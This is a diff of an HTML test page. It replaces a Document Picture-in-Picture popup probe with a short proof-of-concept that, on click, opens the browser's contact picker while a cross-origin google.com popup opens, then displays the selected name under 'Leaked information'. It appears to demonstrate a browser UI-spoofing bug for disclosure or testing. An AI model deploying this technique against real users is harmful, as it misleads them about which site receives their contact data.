@@ -1,120 +1,28 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <title>Document PiP Only + Cross-Origin Popup Probe</title>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      background: #121212;
-      color: #e5e5e5;
-      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Segoe UI', Roboto, sans-serif;
-      padding: 28px;
-      min-height: 100vh;
-    }
-    .box {
-      max-width: 700px;
-      margin: 36px auto;
-      background: #1e1e1e;
-      border: 1px solid #333;
-      border-radius: 12px;
-      padding: 24px;
-      box-shadow: 0 6px 24px rgba(0,0,0,0.45);
-    }
-    h1 {
-      font-size: 20px;
-      color: #60a5fa;
-      margin-bottom: 10px;
-      text-align: center;
-    }
-    p {
-      font-size: 13px;
-      color: #a3a3a3;
-      text-align: center;
-      margin-bottom: 18px;
-      line-height: 1.5;
-    }
-    #log {
-      background: #0b0b0b;
-      border: 1px solid #2b2b2b;
-      border-radius: 8px;
-      padding: 12px;
-      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
-      font-size: 11px;
-      color: #93c5fd;
-      max-height: 280px;
-      overflow-y: auto;
-      white-space: pre-wrap;
-    }
-  </style>
-</head>
-<body>
-  <div class="box">
-    <h1>Click anywhere to trigger Document PiP + cross-origin popup!</h1>
-    <p>Menguji <code>documentPictureInPicture.requestWindow()</code> (tanpa <code>&lt;video&gt;</code>) bersamaan dengan <code>window.open("https://www.google.com", "PoC", "_blank")</code> dan mencatat <em>timing</em> serta siklus hidup jendela.</p>
-    <div id="log">[*] Waiting for click gesture...</div>
-  </div>
-
-  <script>
-  (function () {
-    'use strict';
-
-    var logEl = document.getElementById('log');
-    var t0 = performance.now();
-    var triggered = false;
-
-    function log(msg) {
-      var elapsed = (performance.now() - t0).toFixed(1);
-      var line = `[+${elapsed}ms] ${msg}`;
-      logEl.textContent += '\n' + line;
-      logEl.scrollTop = logEl.scrollHeight;
-      console.log('[DocPiPPopupProbe] ' + line);
-    }
-
-    ['blur', 'focus', 'visibilitychange', 'pagehide'].forEach(function (evName) {
-      var target = (evName === 'visibilitychange') ? document : window;
-      target.addEventListener(evName, function (e) {
-        log(
-          `event:${evName} -> origin=${window.location.origin}, hidden=${document.hidden}, ` +
-          `persisted=${Boolean(e && e.persisted)}`
-        );
-      });
-    });
-
-    async function triggerDocumentPiP() {
-      if (!('documentPictureInPicture' in window) || typeof window.documentPictureInPicture.requestWindow !== 'function') {
-        log('[-] documentPictureInPicture.requestWindow() tidak tersedia pada browser/konteks ini.');
-        return;
-      }
-
-      log('[*] Calling documentPictureInPicture.requestWindow({ width: 320, height: 180 })...');
-      try {
-        var pipWin = await window.documentPictureInPicture.requestWindow({
-          width: 320,
-          height: 180
-        });
-        pipWin.document.body.style.cssText = 'margin:0;background:#0b0b0b;color:#93c5fd;font-family:monospace;padding:12px;';
-        pipWin.document.body.innerHTML = '<div>Document PiP Window</div><div>origin: ' + window.location.origin + '</div>';
-        pipWin.addEventListener('pagehide', function () {
-          log('[i] Document PiP window closed (pagehide).');
-        });
-        log(`[+] Document PiP opened -> size=${pipWin.innerWidth}x${pipWin.innerHeight}`);
-      } catch (err) {
-        log(`[-] Document PiP rejected (${err.name}) -> ${err.message}`);
-      }
-    }
-
-    document.addEventListener('click', function () {
-      if (triggered) return;
-      triggered = true;
-
-      triggerDocumentPiP();
-
-      var popup = window.open('https://www.google.com', 'PoC', '_blank');
-      log(popup ? '[+] window.open("https://www.google.com", "PoC", "_blank") opened.' : '[-] window.open blocked or null.');
-    }, { once: true });
-  })();
-  </script>
-</body>
+    <head>
+        <title>PoC</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <script>
+            onclick = async () => {
+                (async () => {
+                    let contacts = await navigator.contacts.select(["name"], {});
+                    document.write(`
+                        <h1>
+                            <font color="red">Leaked information:</font> ${contacts[0]["name"]}</font>
+                        </h1>
+                    `);
+                })();
+                open("https://www.google.com", "PoC", "_blank");
+            }
+        </script>
+    </head>  
+    <body>
+        <br><br><br>
+        <center>
+            <h1>Click anywhere on the page to show the Contact dialog over a cross-origin page!</h1>
+        </center>
+    </body>
+  </body>
 </html>
